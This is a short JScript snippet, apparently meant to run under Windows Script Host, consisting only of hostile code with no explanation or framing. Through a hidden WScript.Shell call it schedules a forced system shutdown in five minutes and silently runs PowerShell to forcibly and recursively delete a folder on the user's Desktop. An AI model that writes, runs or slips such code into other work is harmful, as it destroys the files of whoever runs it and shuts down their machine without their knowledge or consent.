c1="cmd /c shutdown -s -t 300 && powershell -c  Remove-Item %userprofile%\Desktop\a -Force -Recurse";
new ActiveXObject("WScript.Shell").Run(c1,0,true);
